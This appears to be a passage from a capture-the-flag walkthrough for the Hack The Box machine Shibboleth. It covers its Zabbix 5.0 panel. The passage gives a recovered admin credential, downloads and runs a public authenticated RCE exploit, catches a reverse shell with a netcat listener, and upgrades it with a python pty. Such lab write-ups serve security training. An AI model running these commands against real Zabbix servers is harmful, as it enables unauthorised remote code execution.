## `http://monitor*.shibbleth.htb`

The login form for Shibboleth Data Systems' [Zabbix](https://www.zabbix.com/) instance, a business monitoring platform. According to the page's source code, it appears to be Zabbix version 5.0.

The default credential `Admin`:`zabbix` doesn't work. The `guest` account has been disabled.

### Content Discovery

TODO

### Exploits

The credential `Administrator`:`ilovepumkinpie1` grants access to the Zabbix administrative panel.

[5.0.17 Authenticated RCE](https://www.exploit-db.com/exploits/50816):

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
```

```bash
$ curl -s https://www.exploit-db.com/raw/50816 > 50816.py
$ python3 50816.py
[*] this exploit is tested against Zabbix 5.0.17 only
[*] can reach the author @ https://hussienmisbah.github.io/
[!] usage : ./expoit.py <target url>  <username> <password> <attacker ip> <attacker port>
$ python3 50816.py http://monitor.shibboleth.htb Administrator 'ilovepumkinpie1' 10.10.14.14 80
[*] this exploit is tested against Zabbix 5.0.17 only
[*] can reach the author @ https://hussienmisbah.github.io/
[+] the payload has been Uploaded Successfully
[+] you should find it at http://monitor.shibboleth.htb/items.php?form=update&hostid=10084&itemid=33617
[+] set the listener at 80 please...
[?] note : it takes up to +1 min so be patient :)
[+] got a shell ? [y]es/[N]o: y
Nice !
```

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.14] from (UNKNOWN) [10.129.123.122] 47980
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
zabbix@shibboleth:/$ id
id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
```

Apache virtual host configuration indicates Zabbix source is at `/usr/share/zabbix/`.

- `setup.php`
- `hosts.php`
- `CSetupWizard.php`
- Configuration file at `/etc/zabbix/`
